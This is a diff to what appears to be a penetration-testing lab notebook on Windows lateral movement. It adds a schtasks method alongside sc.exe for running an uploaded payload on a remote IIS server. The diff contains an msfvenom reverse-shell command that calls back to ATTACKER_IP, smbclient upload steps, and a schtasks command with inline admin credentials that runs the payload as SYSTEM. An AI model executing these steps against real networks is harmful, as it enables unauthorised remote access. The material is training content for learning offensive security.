@@ -67,7 +67,7 @@ $ smbclient -c "put <service_exec_name>.exe" -U admin -W test.com '//iis.test.co
 ```
 {% endcode %}
 
-> Replace `service_exec_name>.exe` with the name of the executable file created with msfvenom
+> Replace `service_exec_name>.exe` with the name of the executable file created with `msfvenom`
 
 _Start the msfconsole listener (used to catch the shell in one of the later step):_
 
@@ -85,6 +85,8 @@ msf6 exploit(multi/handler) > exploit
 {% embed url="https://jarrettgxz-sec.gitbook.io/networking-concepts/networking-tools/miscellaneous/smbclient" %}
 
 #### 3. Spawn a remote `/netonly` shell session on the intermediate server (as the admin)&#x20;
+
+The reason we have to perform this step, is because the `sc.exe` command (refer to step 4. below) does not provide a built-in method to supply user credentials for another user aside from the one executing the command.
 
 Start a listener on the attacker machine on eg. port **8888**
 
@@ -124,7 +126,7 @@ Now, with a shell session as the admin, we can create a service executable that 
 # start powershell
 C:\> powershell
 
-PS> sc.exe \\iis.test.com create rvshell binPath= "%windir%\myservice.exe" start= auto
+PS> sc.exe \\iis.test.com create rvshell binPath= "%windir%\service_exec_name>.exe" start= auto
 PS> sc.exe \\iis.test.com start rvshell
 ```
 {% endcode %}
@@ -154,7 +156,7 @@ C:\Users\user> sc.exe ...
 Access is denied.
 ```
 
-_**(2)**_ It will not work expected if we tried to establish a reverse shell connection from the admin shell directly with `sc.exe` using the `binPath` option:
+_**(2)**_ It will not work as expected if we tried to establish a reverse shell connection from the admin shell directly with `sc.exe` using the `binPath` option:
 
 {% code title="jmp.test.com (admin)" overflow="wrap" %}
 ```powershell
@@ -168,13 +170,55 @@ More accurately, this action will actually establish a remote shell on the targe
 
 This is because the service manager expects the executable that is being executed to function as a service executable (perform certain actions), which is different from standard `.exe` files, as with what we have provided. The method we have explored with `msfvenom` works as it encapsulates the payload within a valid service executable.
 
+### 2. Using `schtasks`&#x20;
+
+#### 1. SSH into the intermediary server, craft the reverse shell payload and upload to the IIS server
+
+Follow the process in steps 1 and 2 in the first (with **sc.exe**), with the only difference that the reverse shell payload created with `msfvenom` should have the format `exe` instead of `exe-service` :
+
+{% code overflow="wrap" %}
+```sh
+$ msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=9999 -o <exec_name>.exe
+```
+{% endcode %}
+
+The steps to upload the created payload to the `admin$` share with `smbclient` , and to start the listener with `msfconsole` will be the same.
+
+#### 2. Create and start a task (`schtasks`) on the target IIS machine that executes the uploaded reverse shell payload
+
+In the first example (with **sc.exe**), we are required to use the `runas.exe` binary to provide ourselves with a `/netonly` command prompt to perform the `sc.exe` command with admin privileges. However, with the `schtasks` command, we are able to directly supply the user credentials for the user we want to perform the action as (in our case, this will be the admin user).
+
+{% embed url="https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/lateral-movement-and-pivoting/spawning-remote-processes/schtasks-pending-test" %}
+
+{% code title="Create the task on the target IIS machine" overflow="wrap" %}
+```powershell
+C:\Users\user> schtasks /create /s iis.test.com /ru "SYSTEM" /u admin /p pass /tn "revshell" /tr "%windir%\service_exec_name>.exe" /sc ONCE /st 00:00
+```
+{% endcode %}
+
+> Replace `service_exec_name>.exe` with the name of the uploaded reverse shell payload.
+
+* `/sd` : This flag can be omitted
+
+{% code title="Run the task" overflow="wrap" %}
+```powershell
+C:\Users\user> schtasks /run /s iis.test.com /tn "revshell"
+```
+{% endcode %}
+
+Now, we should retrieve a reverse shell connection (as the _**system**_ user) from the `msfconsole` session established earlier:
+
+```powershell
+C:\Windows/system32> hostname
+iis
+
+C:\Windows/system32> whoami
+nt authority\system
+```
+
 ### What we can learn
 
-1. `smbclient` automatically uploads to the `...` directory
+1. When we connect to the `admin$` SMB share with `smbclient` for upload, it will be automatically uploaded to the `%windir%` directory. This is because the `admin$` share maps to the `%windir%` (usually `C:\Windows` ) on the remote machine
 
-* We can observe this from ....
-
-
-
-2. ...
+* this the reason we prefix our `binPath` and `/tr` command (for _**sc**_ and _**schtasks**_ respectively) with `%windir%` when referencing the uploaded binary on the remote machine
 
